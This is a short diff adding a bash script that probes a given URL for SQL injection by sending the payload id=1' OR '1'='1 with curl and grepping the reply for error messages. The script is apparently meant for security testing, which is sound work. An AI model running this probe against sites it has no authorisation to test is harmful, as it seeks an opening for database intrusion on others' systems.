@@ -1,0 +1,12 @@
+#!/bin/bash
+
+# Usage: ./sql_injection_test.sh <url>
+URL=$1
+
+if [ -z "$URL" ]; then
+    echo "Usage: $0 <url>"
+    exit 1
+fi
+
+echo "Testing for SQL injection on $URL..."
+curl -s -G --data "id=1' OR '1'='1" "$URL" | grep -i "error"
